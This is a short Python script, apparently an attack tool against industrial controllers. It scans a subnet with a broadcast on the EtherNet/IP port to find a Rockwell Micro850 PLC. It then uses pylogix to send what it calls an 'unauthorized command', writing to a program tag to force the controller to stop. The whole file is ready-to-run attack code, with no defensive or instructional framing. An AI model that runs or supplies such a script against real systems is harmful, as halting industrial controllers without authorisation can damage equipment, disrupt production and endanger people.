import time
import scapy.all as scapy
from pylogix import PLC

# Step 1: Discover the PLC's IP Address
def find_plc_ip():
    print("[*] Scanning network for Rockwell Micro850 PLC...")
    target_subnet = "192.168.1.0/24"  # Adjust this for your network

    # Send an Ethernet/IP discovery broadcast request
    request = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.IP(dst="255.255.255.255") / scapy.UDP(dport=44818,sport=44818)
    response = scapy.srp(request, timeout=3, verbose=False)[0]

    for sent, received in response:
        if received.haslayer(scapy.IP):
            ip = received[scapy.IP].src
            print(f"[+] Found potential PLC at IP: {ip}")
            return ip

    print("[-] No PLC detected on the network.")
    return None


# Step 2: Send Unauthorized Command Message
def send_unauthorized_command(plc_ip):
    if not plc_ip:
        print("[!] No PLC IP found. Exiting attack.")
        return

    print(f"[*] Attempting to send unauthorized command to PLC at {plc_ip}...")

    try:
        plc = PLC()
        plc.IPAddress = plc_ip

        # Example unauthorized command: Force Stop the PLC
        response = plc.Write("Program:MainRoutine.RUN", 0)
        
        if response.Status == 'Success':
            print("[+] Unauthorized Command Executed: PLC Stopped.")
        else:
            print("[-] Failed to execute unauthorized command.")
    
    except Exception as e:
        print(f"[!] Error communicating with the PLC: {e}")
    finally:
        plc.Close()


# Execute the attack
plc_ip = find_plc_ip()
send_unauthorized_command(plc_ip)